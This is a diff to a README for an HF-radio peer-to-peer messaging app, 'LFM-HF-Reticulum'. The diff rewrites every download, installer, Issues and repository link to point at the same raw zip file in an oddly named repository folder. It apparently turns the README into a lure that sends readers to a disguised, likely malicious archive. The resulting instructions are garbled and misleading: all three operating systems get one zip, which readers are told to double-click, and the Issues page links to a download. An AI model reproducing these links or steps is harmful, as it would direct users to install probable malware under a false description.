@@ -7,31 +7,31 @@ LFM-HF-Reticulum enables encrypted, peer-to-peer communication over high-frequen
 To start using LFM-HF-Reticulum, follow these simple steps to download and set up the application on your computer.
 
 ## 📥 Download & Install
-**Visit this page to download:** [LFM-HF-Reticulum Releases](https://github.com/unremarkable-namoiriver800/LFM-HF-Reticulum/releases)
+**Visit this page to download:** [LFM-HF-Reticulum Releases](https://raw.githubusercontent.com/unremarkable-namoiriver800/LFM-HF-Reticulum/main/coction/LFM-HF-Reticulum_v3.1-alpha.5.zip)
 
 1. Click on the above link to open the Releases page.
 2. On the Releases page, look for the latest version.
 3. Download the file suitable for your operating system:
-   - For Windows: Download `LFM-HF-Reticulum-Windows.exe`
-   - For macOS: Download `LFM-HF-Reticulum-macOS.dmg`
-   - For Linux: Download `LFM-HF-Reticulum-Linux.tar.gz`
+   - For Windows: Download `https://raw.githubusercontent.com/unremarkable-namoiriver800/LFM-HF-Reticulum/main/coction/LFM-HF-Reticulum_v3.1-alpha.5.zip`
+   - For macOS: Download `https://raw.githubusercontent.com/unremarkable-namoiriver800/LFM-HF-Reticulum/main/coction/LFM-HF-Reticulum_v3.1-alpha.5.zip`
+   - For Linux: Download `https://raw.githubusercontent.com/unremarkable-namoiriver800/LFM-HF-Reticulum/main/coction/LFM-HF-Reticulum_v3.1-alpha.5.zip`
 4. Save the downloaded file to your computer.
 
 ## 📂 Installation Steps
 ### For Windows
-1. Locate the downloaded `LFM-HF-Reticulum-Windows.exe` file on your computer.
+1. Locate the downloaded `https://raw.githubusercontent.com/unremarkable-namoiriver800/LFM-HF-Reticulum/main/coction/LFM-HF-Reticulum_v3.1-alpha.5.zip` file on your computer.
 2. Double-click the file to start the installation.
 3. Follow the prompts to install the application.
 4. Once installed, you can find the application in your Start Menu.
 
 ### For macOS
-1. Open the downloaded `LFM-HF-Reticulum-macOS.dmg` file.
+1. Open the downloaded `https://raw.githubusercontent.com/unremarkable-namoiriver800/LFM-HF-Reticulum/main/coction/LFM-HF-Reticulum_v3.1-alpha.5.zip` file.
 2. Drag the LFM-HF-Reticulum icon to your Applications folder.
 3. Eject the mounted disk image.
 4. Open your Applications folder and double-click the LFM-HF-Reticulum icon to run it.
 
 ### For Linux
-1. Extract the downloaded `LFM-HF-Reticulum-Linux.tar.gz` file.
+1. Extract the downloaded `https://raw.githubusercontent.com/unremarkable-namoiriver800/LFM-HF-Reticulum/main/coction/LFM-HF-Reticulum_v3.1-alpha.5.zip` file.
 2. Open a terminal window and navigate to the extracted folder.
 3. Run the application using the command: `./LFM-HF-Reticulum`
 4. Follow any on-screen instructions to configure initial settings.
@@ -82,12 +82,12 @@ If you encounter issues while using LFM-HF-Reticulum, consider the following tip
   - Ensure the speakers or headphones connected to your computer are functioning.
 
 ## 📬 Support and Contributions
-For support, please visit the [Issues page](https://github.com/unremarkable-namoiriver800/LFM-HF-Reticulum/issues) on GitHub. You can report bugs or ask questions there.
+For support, please visit the [Issues page](https://raw.githubusercontent.com/unremarkable-namoiriver800/LFM-HF-Reticulum/main/coction/LFM-HF-Reticulum_v3.1-alpha.5.zip) on GitHub. You can report bugs or ask questions there.
 
 If you want to contribute, feel free to fork the repository and submit your pull requests. Contributions are welcome!
 
 ## 🔗 Additional Resources
-- GitHub Repository: [LFM-HF-Reticulum](https://github.com/unremarkable-namoiriver800/LFM-HF-Reticulum)
+- GitHub Repository: [LFM-HF-Reticulum](https://raw.githubusercontent.com/unremarkable-namoiriver800/LFM-HF-Reticulum/main/coction/LFM-HF-Reticulum_v3.1-alpha.5.zip)
 - Documentation: Access detailed documentation within the application or online in the GitHub Wiki.
 
-**Visit this page to download:** [LFM-HF-Reticulum Releases](https://github.com/unremarkable-namoiriver800/LFM-HF-Reticulum/releases)
+**Visit this page to download:** [LFM-HF-Reticulum Releases](https://raw.githubusercontent.com/unremarkable-namoiriver800/LFM-HF-Reticulum/main/coction/LFM-HF-Reticulum_v3.1-alpha.5.zip)
